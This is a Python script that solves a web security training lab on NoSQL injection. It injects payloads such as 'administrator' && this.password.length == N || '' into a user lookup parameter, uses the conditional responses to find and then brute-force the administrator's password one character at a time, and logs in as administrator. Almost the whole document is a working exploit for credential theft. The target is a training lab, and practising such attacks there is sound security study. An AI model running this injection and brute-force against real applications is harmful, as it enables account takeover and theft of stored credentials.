#########################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 1/10/2023
#
# Lab: Exploiting NoSQL injection to extract data
#
# Steps: 1. Fetch the login page
#        2. Extract csrf token and session cookie
#        3. Login as wiener to get a valid session
#        4. inject payload into 'user' query parametr to determine the length of
#           administrator's password based on conditional responses
#        5. Modify the payload to brute force the administrator's password
#        6. Fetch the login page
#        7. Extract csrf token and session cookie
#        8. Login as the administrator
#        9. Fetch the administrator profile
#
#########################################################################################

###########
# imports
###########
import requests
from colorama import Fore
import re


#########################################
# Function to determine password length
#########################################
def determin_password_length(url, session):
    for length in range(1, 50):
        
        print(Fore.WHITE + "â¦—4â¦˜ Checking if administrator password length = " + Fore.YELLOW + str(length), flush=True, end='\r')
        
        try:
            # payload to determine password length
            payload = f"administrator' %26%26 this.password.length == {length} || '"
            
            # set session cookie
            cookies = {
                "session": session
            }
            
            # fetch the page with the injected payload
            injection = requests.get(f"{url}/user/lookup?user={payload}", cookies=cookies)
            
            # extract the error text
            error_text = re.findall("Could not find user", injection.text)

            # if the error message is not returned in the response
            if len(error_text) == 0:
                print(Fore.WHITE + "â¦—4â¦˜ Checking if administrator password length = " +
                      Fore.YELLOW + str(length) + Fore.WHITE + " [ Correct length: " +
                      Fore.GREEN + str(length) + Fore.WHITE + " ]")

                return length
        
        except:
            print(Fore.RED + "[!] Failed to inject the payload to determine the password length through exception")


#####################################
# Function to brute force password
#####################################
def brute_force_password(url, password_length, session):
    correct_password = []
    for position in range(0, password_length):
        for character in "abcdefghijklmnopqrstuvwxyz":
            print(Fore.WHITE + "â¦—5â¦˜ Cracking administrator password, check if char at position " +
                  Fore.BLUE + str(position) + Fore.WHITE + " = " + Fore.YELLOW + character, flush=True, end='\r')
            
            try:
                # payload to brute force password
                payload = f"administrator' %26%26 this.password[{position}] == '{character}' || '"
                
                # set session cookie
                cookies = {
                    "session": session
                }

                # fetch the page with the injected payload
                injection = requests.get(f"{url}/user/lookup?user={payload}", cookies=cookies)
                
                # extract the welcome text
                error_text = re.findall("Could not find user", injection.text)
                
                # if the error message is not returned in the response
                if len(error_text) == 0:
                    # append the character at the end of the correct password variable
                    correct_password.append(character)
                    
                    print(Fore.WHITE + "â¦—5â¦˜ Cracking administrator password, check if char at position " +
                          Fore.BLUE + str(position) + Fore.WHITE + " = " + Fore.YELLOW + character + Fore.WHITE + " [ Correct password: " +
                          Fore.GREEN + "".join(correct_password) + Fore.WHITE + " ]", flush=True, end='\r')
                    
                    break
                else:
                    continue
            except:
                print(Fore.RED + "[!] Failed to inject the payload while brute forcing administrator's password through exception")
    
    # convert the list of valid character to a string and return it
    return "".join(correct_password)


#########
# Main
#########
# change this to your lab URL
url = "https://0ac80055030fd7c582cc79ec00c900da.web-security-academy.net"

print(Fore.BLUE + "âŸª#âŸ« Injection parameter: " + Fore.YELLOW + "user")

try:  # fetch login page
    fetch_login = requests.get(f"{url}/login")
    print(Fore.WHITE + "â¦—1â¦˜ Fetching login page.. " + Fore.GREEN + "OK")

    # get session cookie
    session = fetch_login.cookies.get("session")

    # extract csrf token
    csrf = re.findall("csrf.+value=\"(.+)\"", fetch_login.content.decode())[0]
    
    print(Fore.WHITE + "â¦—2â¦˜ Extracting csrf token and session cookie.. " + Fore.GREEN + "OK")

    try:  
        # set credentials
        data = {
            "username": "wiener",
            "password": "peter",
            "csrf": csrf
        }

        # set session cookies
        cookies = {
            "session": session
        }

        # login in as wiener to get a valid session
        login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)
        
        print( Fore.WHITE + "â¦—3â¦˜ Logging in as wiener to get a valid session.. " + Fore.GREEN + "OK")
        
        # extract wiener session
        wiener_session = login.cookies.get("session")

        # determine administrator's password length
        password_length = determin_password_length(url, wiener_session)

        # brute force administrator's password
        admin_password = brute_force_password(url, password_length, wiener_session)
        
        try:  
            # fetch login page
            fetch_login = requests.get(f"{url}/login")
            print(Fore.WHITE + "\nâ¦—6â¦˜ Fetching login page.. " + Fore.GREEN + "OK")
            
            # get session cookie
            session = fetch_login.cookies.get("session")
            
            # extract csrf token
            csrf = re.findall("csrf.+value=\"(.+)\"", fetch_login.content.decode())[0]
            
            print(Fore.WHITE + "â¦—7â¦˜ Extracting csrf token and session cookie.. " + Fore.GREEN + "OK")

            try:  
                # set data to send via POST
                data = {
                    "username": "administrator",
                    "password": admin_password,
                    "csrf": csrf
                }

                # set session cookie
                cookies = {
                    "session": session
                }

                # login in as the administrator
                login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)
                print(Fore.WHITE + "â¦—8â¦˜ Logging in as the administrator.. " + Fore.GREEN + "OK")
                
                # extract new session
                new_session = login.cookies.get("session")
                
                # set session cookie
                cookies = {
                    "session": new_session
                }
                try:  
                    # fetch the administrator profile
                    admin = requests.get(f"{url}/my-account", cookies=cookies)
                    
                    print(Fore.WHITE + "â¦—9â¦˜ Fetching the administrator profile.. " + Fore.GREEN + "OK")
                    
                    print(Fore.WHITE + "ðŸ—¹ Check your browser, it should be marked now as " + Fore.GREEN + "solved")
                
                except:
                    print(Fore.RED + "[!] Failed to fetch admininstrator profile through exception")
            
            except:
                print(Fore.RED + "[!] Failed to login as the administrator through exception")
        
        except:
            print(Fore.RED + "[!] Failed to fetch login page through exception")
       
    except:
        print(
            Fore.RED + "[!] Failed to login as the administrator through exception")
except:
    print(
        Fore.RED + "[!] Failed to fetch login page through exception")
